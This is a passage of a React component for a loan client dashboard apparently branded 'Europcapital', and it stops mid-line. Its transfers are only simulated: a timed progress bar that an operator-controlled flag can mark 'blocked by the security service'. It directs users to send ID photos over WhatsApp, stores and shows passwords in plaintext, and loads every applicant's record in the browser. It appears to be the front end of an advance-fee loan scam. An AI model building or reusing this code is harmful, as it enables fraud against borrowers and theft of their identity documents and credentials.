
import React, { useState, useEffect } from 'react';
import { useTranslation } from 'react-i18next';
import { Language, User, Transaction } from '../types';
import { restdbService } from '../services/restdb';
import { 
  User as UserIcon, Euro, CheckCircle2, Clock, AlertCircle, FileText, ArrowRight, TrendingUp, ShieldCheck, 
  Loader2, MessageCircle, Lock, Hourglass, FileBadge, CreditCard, Copy, Send, Wallet, Ban, 
  LayoutDashboard, UserCircle, History, Settings, Building, MapPin, Briefcase, Phone, Mail, Calendar, LogOut, XCircle, X, Download, Eye, EyeOff, Info,
  ArrowUpRight, ArrowDownLeft
} from 'lucide-react';

interface ClientDashboardProps {
  language: Language;
  user: User;
  onNavigate: (page: string) => void;
}

const ClientDashboard: React.FC<ClientDashboardProps> = ({ language, user, onNavigate }) => {
  const { t } = useTranslation();
  const dashT = t('client_dashboard', { returnObjects: true }) as any;
  
  const [loan, setLoan] = useState<any | null>(null);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState<'overview' | 'profile' | 'transfer'>('overview');
  
  const [transferAmount, setTransferAmount] = useState('');
  const [transferIban, setTransferIban] = useState('');
  const [transferSwift, setTransferSwift] = useState('');
  const [transferBeneficiary, setTransferBeneficiary] = useState('');
  const [transferLoading, setTransferLoading] = useState(false);
  const [transferError, setTransferError] = useState<string | null>(null);
  
  const [activeTransfer, setActiveTransfer] = useState<any>(null);
  const [progress, setProgress] = useState(0);
  const [transferBlockedError, setTransferBlockedError] = useState<string | null>(null);

  const [selectedTx, setSelectedTx] = useState<Transaction | null>(null);
  const [showPassword, setShowPassword] = useState(false);

  const isDemo = user.email === 'demo@europcapital.com';

  const fetchData = async () => {
    try {
      if (user.id) {
          const apps = await restdbService.getAllApplications();
          const userApp = apps.find((a: any) => a._id === user.id);
          if (userApp) {
            setLoan(userApp);
            setActiveTransfer(userApp.currentTransfer || null);
          }
      }
    } catch (e) {
      console.error("Dashboard Fetch Error:", e);
    }
    setLoading(false);
  };

  useEffect(() => {
    fetchData();
  }, [user.id, user.email, isDemo]);

  useEffect(() => {
    if (!activeTransfer) return;
    const interval = setInterval(async () => {
        const now = Date.now();
        const start = activeTransfer.startTime;
        const end = activeTransfer.endTime;
        if (now >= end) {
            clearInterval(interval);
            setProgress(100);
            const isBlocked = loan.isBlocked === true;
            const newHistory: Transaction = {
                id: `TX-${Date.now()}`,
                type: 'debit',
                amount: activeTransfer.amount,
                label: `Virement vers ${activeTransfer.beneficiary}`,
                date: new Date().toISOString(),
                status: isBlocked ? 'failed' : 'completed',
                beneficiary: activeTransfer.beneficiary,
                iban: activeTransfer.iban,
                swift: activeTransfer.swift
            };
            const updatedHistory = [newHistory, ...(loan.transferHistory || [])];
            let newBalance = loan.balance || 0;
            if (isBlocked) {
                setTransferBlockedError(loan.blockReason || "Virement bloqué par le service sécurité.");
                newBalance += activeTransfer.amount;
            }
            if (!isDemo) {
                await restdbService.updateApplication(loan._id, { 
                    balance: newBalance,
                    currentTransfer: null,
                    transferHistory: updatedHistory
                });
            }
            setLoan((prev: any) => ({ ...prev, balance: newBalance, currentTransfer: null, transferHistory: updatedHistory }));
            setActiveTransfer(null);
        } else {
            const totalDuration = end - start;
            const elapsed = now - start;
            setProgress(Math.min(100, Math.floor((elapsed / totalDuration) * 100)));
        }
    }, 2000); 
    return () => clearInterval(interval);
  }, [activeTransfer, loan, isDemo]);

  const handleCopyRib = () => {
    if (loan && loan.iban) {
      navigator.clipboard.writeText(`IBAN: ${loan.iban}\nBIC: ${loan.bic}`);
      alert("Coordonnées copiées !");
    }
  };

  const calculateDurationMs = (val: number, unit: string) => {
    const min = 60 * 1000;
    const hour = 60 * min;
    const day = 24 * hour;
    if (unit === 'minutes') return val * min;
    if (unit === 'days') return val * day;
    return val * hour;
  };

  const handleTransfer = async (e: React.FormEvent) => {
    e.preventDefault();
    setTransferError(null);
    if (!loan) return;
    const amount = parseFloat(transferAmount);
    if (isNaN(amount) || amount <= 0) { setTransferError("Montant invalide."); return; }
    if (amount > (loan.balance || 0)) { setTransferError("Solde insuffisant."); return; }
    setTransferLoading(true);
    try {
      const durationMs = calculateDurationMs(loan.transferDelay || 24, loan.transferDelayUnit || 'hours');
      const startTime = Date.now();
      const endTime = startTime + durationMs;
      const newBalance = (loan.balance || 0) - amount;
      const transferData = { amount, beneficiary: transferBeneficiary, iban: transferIban, swift: transferSwift, startTime, endTime, status: 'in_progress' };
      if (!isDemo) { await restdbService.updateApplication(loan._id, { balance: newBalance, currentTransfer: transferData }); }
      setLoan({ ...loan, balance: newBalance });
      setActiveTransfer(transferData);
      setTransferBlockedError(null);
      setTransferAmount(''); setTransferIban(''); setTransferSwift(''); setTransferBeneficiary('');
      setActiveTab('overview');
    } catch (error) { setTransferError("Erreur lors de l'initiation du virement."); } finally { setTransferLoading(false); }
  };

  if (loading) return <div className="h-screen flex items-center justify-center bg-gray-50"><Loader2 className="w-10 h-10 text-emerald-600 animate-spin" /></div>;

  if (loan && loan.status === 'pending') return (
      <div className="pt-24 sm:pt-32 pb-20 bg-gray-50 min-h-screen">
        <div className="max-w-3xl mx-auto px-4">
            <div className="text-center mb-12 space-y-2">
                <h1 className="text-2xl sm:text-4xl font-black text-gray-900">{dashT.welcome}, {loan.firstName}</h1>
                <p className="text-gray-500 font-medium">Analyse de dossier en cours</p>
            </div>
            <div className="bg-white rounded-[2.5rem] overflow-hidden shadow-2xl border border-gray-100">
                <div className="bg-orange-50 p-5 border-b border-orange-100 flex items-start gap-3">
                    <Hourglass className="w-5 h-5 text-orange-600 animate-pulse mt-0.5" />
                    <div><h3 className="text-sm font-black text-orange-800">Action requise</h3><p className="text-orange-700 text-[11px] font-medium">Envoyez vos documents par WhatsApp pour débloquer l'accès.</p></div>
                </div>
                <div className="p-8 sm:p-16 text-center space-y-8">
                    <div className="bg-emerald-50 w-20 h-20 rounded-3xl flex items-center justify-center mx-auto shadow-sm"><FileBadge className="w-10 h-10 text-emerald-600" /></div>
                    <h2 className="text-2xl font-black text-gray-900">Validation d'Identité</h2>
                    <p className="text-gray-600 text-sm sm:text-lg leading-relaxed max-w-md mx-auto">Veuillez transmettre une photo de votre <strong>Pièce d'Identité</strong> via notre canal officiel pour l'activation finale.</p>
                    <a href="https://wa.me/33754095027" target="_blank" rel="noopener noreferrer" className="w-full bg-green-500 text-white py-5 rounded-2xl font-black shadow-xl shadow-green-100 flex items-center justify-center gap-3 text-lg hover:bg-green-600 transition-all">
                        <MessageCircle className="w-6 h-6" /> WhatsApp Officiel
                    </a>
                </div>
            </div>
        </div>
      </div>
  );

  return (
    <div className="pt-20 sm:pt-28 pb-20 bg-gray-50 min-h-screen">
      <div className="max-w-7xl mx-auto px-3 sm:px-6 lg:px-8 space-y-4 sm:space-y-8">
        
        <div className="flex flex-col gap-1 sm:gap-2 mb-2 sm:mb-6">
            <p className="text-gray-400 font-black uppercase tracking-widest text-[9px] sm:text-xs">{dashT.portal_title}</p>
            <h1 className="text-2xl sm:text-4xl font-black text-gray-900 truncate">{dashT.welcome}, {loan.firstName}</h1>
        </div>

        {transferBlockedError && (
            <div className="bg-red-50 border border-red-100 rounded-2xl p-4 flex items-start gap-3 animate-in slide-in-from-top-4 shadow-sm">
                <AlertCircle className="w-5 h-5 text-red-600 shrink-0 mt-0.5" />
                <div className="text-xs sm:text-sm">
                    <h3 className="font-black text-red-900">{dashT.op_denied}</h3>
                    <p className="text-red-700 mt-1">{transferBlockedError}</p>
                </div>
            </div>
        )}

        <div className="grid lg:grid-cols-12 gap-4 sm:gap-8">
            <div className="lg:col-span-3">
                <div className="bg-white rounded-2xl sm:rounded-3xl p-1 sm:p-4 shadow-sm border border-gray-100 lg:sticky lg:top-24 z-20">
                    <nav className="grid grid-cols-3 lg:grid-cols-1 gap-1 sm:gap-2">
                        {[
                            { id: 'overview', label: "Accueil", icon: LayoutDashboard },
                            { id: 'transfer', label: dashT.external_transfer, icon: Send },
                            { id: 'profile', label: "Mon Profil", icon: UserCircle }
                        ].map((tab) => (
                            <button 
                                key={tab.id}
                                onClick={() => setActiveTab(tab.id as any)}
                                className={`flex flex-col lg:flex-row items-center justify-center lg:justify-start gap-1 sm:gap-3 px-2 py-2.5 sm:py-4 rounded-xl font-black transition-all ${activeTab === tab.id ? 'bg-emerald-600 text-white shadow-lg' : 'text-gray-400 lg:text-gray-500 hover:bg-gray-50'}`}
                            >
                                <tab.icon className="w-4 h-4 sm:w-5 sm:h-5" />
                                <span className="text-[9px] sm:text-sm whitespace-nowrap">{tab.label}</span>
                            </button>
                        ))}
                    </nav>
                </div>
            </div>

            <div className="lg:col-span-9 space-y-4 sm:space-y-8">
                {activeTab === 'overview' && (
                    <div className="space-y-4 sm:space-y-8 animate-in fade-in duration-300">
                        <div className="grid md:grid-cols-2 gap-4 sm:gap-6">
                            <div className="bg-gray-900 rounded-[2rem] p-6 sm:p-10 text-white relative overflow-hidden shadow-2xl flex flex-col justify-between min-h-[220px] sm:min-h-[280px]">
                                <div className="absolute top-0 right-0 w-48 h-48 sm:w-64 sm:h-64 bg-emerald-500/10 rounded-full blur-[60px] sm:blur-[80px]"></div>
                                <div className="relative z-10 flex justify-between items-start">
                                    <div>
                                        <p className="text-emerald-400 text-[9px] sm:text-[10px] font-black uppercase tracking-widest mb-1">{dashT.available_label}</p>
                                        <h2 className="text-2xl sm:text-5xl font-black tracking-tight leading-none">
                                            {loan.balance?.toLocaleString('fr-FR', { minimumFractionDigits: 2 })} <span className="text-lg sm:text-3xl opacity-50">€</span>
                                        </h2>
                                    </div>
                                    <div className="bg-white/10 p-2 rounded-lg backdrop-blur-md border border-white/5"><Building className="w-4 h-4 sm:w-6 sm:h-6 text-emerald-400" /></div>
                                </div>
                                <div className="relative z-10 space-y-4">
                                    <p className="font-mono text-gray-500 text-[10px] sm:text-sm tracking-[0.2em]">**** **** **** {loan.iban?.slice(-4)}</p>
                                    <button onClick={() => setActiveTab('transfer')} className="w-full bg-emerald-600 hover:bg-emerald-500 text-white py-3 rounded-xl font-black text-[10px] sm:text-sm shadow-xl transition-all uppercase">
                                        {dashT.external_transfer}
                                    </button>
                                </div>
                            </div>

                            <div className="bg-white rounded-[2rem] p-6 sm:p-10 border border-gray-100 shadow-sm flex flex-col justify-between relative">
                                <div className="relative z-10 space-y-5 sm:space-y-6">
                                   <div className="flex justify-between items-center">
                                      <h3 className="text-xs sm:text-base font-black text-gray-900 flex items-center gap-2">
                                        <CreditCard className="w-4 h-4 sm:w-5 sm:h-5 text-emerald-600" /> {dashT.rib_details}
                                      </h3>
                                      <button onClick={handleCopyRib} className="p-2 bg-gray-50 rounded-lg hover:text-emerald-600 transition-colors"><Copy className="w-4 h-4" /></button>
                                   </div>
                                   <div className="space-y-3">
                                      <div className="bg-gray-50/50 p-3 sm:p-4 rounded-xl border border-gray-100">
                                        <p className="text-[8px] sm:text-[9px] font-black text-gray-400 uppercase tracking-widest mb-1">{dashT.iban_label}</p>
                                        <p className="font-mono font-bold text-emerald-800 text-[10px] sm:text-sm break-all">{loan.iban}</p>
                                      </div>
                                      <div className="flex gap-2 sm:gap-3">
                                         <div className="flex-1 bg-gray-50/50 p-2 sm:p-3 rounded-xl border border-gray-100">
                                            <p className="text-[7px] sm:text-[8px] font-black text-gray-400 uppercase tracking-widest mb-0.5">{dashT.bic_label}</p>
                                            <p className="font-mono font-bold text-gray-900 text-[9px] sm:text-xs">{loan.bic}</p>
                                         </div>
                                         <div className="flex-1 bg-gray-50/50 p-2 sm:p-3 rounded-xl border border-gray-100">
                                            <p className="text-[7px] sm:text-[8px] font-black text-gray-400 uppercase tracking-widest mb-0.5">{dashT.currency_label}</p>
                                            <p className="font-bold text-gray-900 text-[9px] sm:text-xs">Euro (€)</p>
                                         </div>
                                      </div>
                                   </div>
                                </div>
                            </div>
                        </div>

                        {activeTransfer && (
                            <div className="bg-gray-900 rounded-3xl p-6 sm:p-8 text-white relative overflow-hidden shadow-xl">
                                <div className="relative z-10 space-y-4">
                                    <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
                                        <div className="flex items-center gap-3">
                                            <Clock className="w-5 h-5 text-emerald-400 animate-pulse" />
                                            <div>
                                                <h3 className="text-sm sm:text-lg font-black uppercase tracking-wider">{dashT.transfer_in_progress}</h3>
                                                <p className="text-gray-400 text-[10px] uppercase font-bold tracking-widest">{dashT.beneficiary_label} : {activeTransfer.beneficiary}</p>
                                            </div>
                                        </div>
                                        <div className="bg-emerald-600 text-white px-3 py-1 rounded-full text-[10px] font-black">
                                            {activeTransfer.amount.toLocaleString()} €
                                        </div>
                                    </div>
                                    <div className="space-y-2">
                                        <div className="w-full bg-gray-800 rounded-full h-2 overflow-hidden">
                                            <div className="bg-emerald-500 h-full transition-all duration-1000" style={{ width: `${progress}%` }}></div>
                                        </div>
                                        <div className="flex justify-between items-center text-[10px] font-black text-emerald-400 uppercase tracking-widest">
                                            <span>{dashT.secure_processing}</span>
                                            <span>{progress}%</span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        )}

                        <div className="bg-white rounded-[2rem] p-6 sm:p-10 border border-gray-100 shadow-sm">
                            <h3 className="text-xs sm:text-lg font-black text-gray-900 mb-6 flex items-center gap-2"><History className="w-5 h-5 text-gray-400" /> {dashT.tx_history}</h3>
                            <div className="space-y-6">
                                {(!loan.transferHistory || loan.transferHistory.length === 0) ? (
                                    <p className="text-center py-10 text-gray-400 text-xs font-black uppercase tracking-widest">{dashT.no_tx}</p>
                                ) : (
                                    loan.transferHistory.map((tx: Transaction) => {
                                        const isCredit = tx.type === 'credit';
                                        return (
                                            <div key={tx.id} onClick={() => setSelectedTx(tx)} className="flex items-center justify-between group cursor-pointer hover:bg-gray-50 -mx-4 px-4 py-2 rounded-2xl transition-all">
                                                <div className="flex items-center gap-3">
                                                    <div className={`p-2 rounded-xl ${
                                                        tx.status === 'failed' ? 'bg-red-50 text-red-500' : 
                                                        isCredit ? 'bg-emerald-50 text-emerald-600' : 'bg-gray-50 text-gray-400'
                                                    }`}>
                                                        {tx.status === 'failed' ? <XCircle className="w-4 h-4" /> : 
                                                         isCredit ? <ArrowDownLeft className="w-4 h-4" /> : <ArrowUpRight className="w-4 h-4" />}
                                                    </div>
                                                    <div>
                                                        <p className={`font-black text-[11px] sm:text-base truncate ${
                                                            tx.status === 'failed' ? 'text-gray-400 line-through' : 
                                                            isCredit ? 'text-emerald-700' : 'text-gray-900'
                                                        }`}>
                                                            {tx.label}
                                                        </p>
                                                        <p className="text-[8px] sm:text-[10px] text-gray-400 font-bold uppercase tracking-widest">{new Date(tx.date).toLocaleDateString()}</p>
                                                    </div>
                                                </div>
                                                <span className={`font-black text-xs sm:text-base ${
                                                    tx.status === 'failed' ? 'text-gray-300' : 
                                                    isCredit ? 'text-emerald-600' : 'text-gray-900'
                                                }`}>
                                                    {isCredit ? '+' : '-'}{tx.amount.toLocaleString()} €
                                                </span>
                                            </div>
                                        );
                                    })
                                )}
                            </div>
                        </div>
                    </div>
                )}

                {activeTab === 'profile' && (
                    <div className="animate-in slide-in-from-right-4 duration-300 space-y-6 sm:space-y-8">
                        <div className="bg-white rounded-[2rem] border border-gray-100 shadow-sm overflow-hidden">
                            <div className="bg-emerald-600 p-8 text-white flex items-center gap-5">
                                <UserCircle className="w-12 h-12 sm:w-16 sm:h-16" />
                                <div>
                                    <h2 className="text-xl sm:text-3xl font-black">{loan.firstName} {loan.lastName}</h2>
                                    <p className="text-emerald-100 text-xs font-bold uppercase tracking-widest">Compte vérifié Europcapital</p>
                                </div>
                            </div>
                            <div className="p-8 sm:p-12 grid sm:grid-cols-2 gap-10">
                                <div className="space-y-4">
                                    <h3 className="text-xs font-black text-gray-400 uppercase tracking-widest mb-4">Contact</h3>
                                    <div className="flex items-center gap-3"><Mail className="w-4 h-4 text-emerald-600" /><p className="text-sm font-bold text-gray-900 break-all">{loan.email}</p></div>
                                    <div className="flex items-center gap-3"><Phone className="w-4 h-4 text-emerald-600" /><p className="text-sm font-bold text-gray-900">{loan.whatsapp}</p></div>
                                    <div className="flex items-center gap-3"><MapPin className="w-4 h-4 text-emerald-600" /><p className="text-sm font-bold text-gray-900">{loan.country}</p></div>
                                </div>
                                <div className="space-y-4">
                                    <h3 className="text-xs font-black text-gray-400 uppercase tracking-widest mb-4">Dossier Financier</h3>
                                    <div className="flex items-center gap-3"><Euro className="w-4 h-4 text-emerald-600" /><p className="text-sm font-bold text-gray-900">{dashT.amount} : {loan.amount?.toLocaleString()} €</p></div>
                                    <div className="flex items-center gap-3"><Calendar className="w-4 h-4 text-emerald-600" /><p className="text-sm font-bold text-gray-900">{dashT.duration} : {loan.duration} mois</p></div>
                                    <div className="flex items-center gap-3"><Briefcase className="w-4 h-4 text-emerald-600" /><p className="text-sm font-bold text-gray-900">{loan.profession}</p></div>
                                </div>
                            </div>
                        </div>

                        <div className="bg-white rounded-[2rem] border border-gray-100 shadow-sm p-8 sm:p-12 space-y-6">
                            <h3 className="text-xs sm:text-lg font-black text-gray-900 flex items-center gap-3">
                                <Lock className="w-5 h-5 text-emerald-600" /> {dashT.security_title}
                            </h3>
                            <div className="bg-gray-50 rounded-2xl p-6 border border-gray-100 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
                                <div className="space-y-1">
                                    <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">{dashT.my_password}</p>
                                    <div className="flex items-center gap-3">
                                        <p className="text-xl font-mono font-black text-gray-900 tracking-wider">
                                            {showPassword ? (loan.password || 'Non défini') : '••••••••'}
                                        </p>
                                        <button onClick={() => setShowPassword(!showPassword)} className="p-1.5 hover:bg-emerald-50 rounded-lg text-gray-400 hover:text-emerald-600 transition-all">
                                            {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                                        </button>
                                    </div>
                                </div>
                                <div className="flex items-center gap-2 bg-emerald-50 text-emerald-700 px-4 py-2 rounded-xl border border-emerald-100">
                                    <ShieldCheck className="w-5 h-5" />
                                    <span className="text-[10px] font-black uppercase">{dashT.biometric_active}</span>
                                </div>
                            </div>
                            <div className="bg-blue-50 p-6 rounded-2xl border border-blue-100 flex items-start gap-4">
                                <Info className="w-6 h-6 text-blue-600 mt-0.5 shrink-0" />
                                <p className="text-xs sm:text-sm text-blue-700 font-medium leading-relaxed">
                                    {dashT.security_info_box}
                                </p>
                            </div>
                        </div>
                    </div>
                )}

                {activeTab === 'transfer' && (
                    <div className="animate-in fade-in slide-in-from-bottom-4 duration-300 max-w-2xl mx-auto">
                        <div className="bg-white rounded-[2rem] border border-gray-100 shadow-2xl overflow-hidden">
                            <div className="bg-gray-900 p-6 sm:p-10 text-white">
                                <h2 className="text-xl font-black flex items-center gap-3"><Send className="w-6 h-6 text-emerald-